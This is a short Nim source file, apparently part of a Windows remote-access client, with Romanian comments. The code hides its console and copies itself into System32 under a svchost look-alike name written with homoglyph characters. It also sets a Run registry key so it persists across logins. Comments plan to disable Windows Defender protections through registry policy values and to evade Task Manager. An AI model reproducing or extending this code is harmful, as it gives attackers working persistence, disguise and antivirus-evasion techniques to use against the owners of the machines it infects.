from winim/inc/wincon import FreeConsole
from os import getAppFilename
from os import copyFile
from os import getEnv
from os import joinPath

import setRegKey
import delRegKey

proc run*(): void =
  # hide the console window
  FreeConsole()

  # copy file to appdata
  let filename: string = getAppFilename()
  # let dest: string = getEnv("appdata").joinPath("client.exe")
  let dest: string = r"C:\Windows\System32".joinPath("svсhоst.exe")

  echo dest

  # imi da crash programul daca incerc sa i dau replace dar el e deschis
  if filename != dest:
    copyFile(filename, dest)

  ## INTERESANT: REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
  ## vezi ca trb sa aiba val 1
  ## https://www.windowscentral.com/how-permanently-disable-windows-defender-antivirus-windows-10
  ## cred ca creez cv key Real-Time Protection folder 1
  ##  -> DisableBehaviorMonitoring DWORD 1
  ##  -> DisableOnAccessProtection  DWORD 1
  ##  -> DisableScanOnRealtimeEnable DWORD 1
  ##

  ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
  ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
  setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "client bla", dest)
  # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bl2", dest)
  # delRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bla")



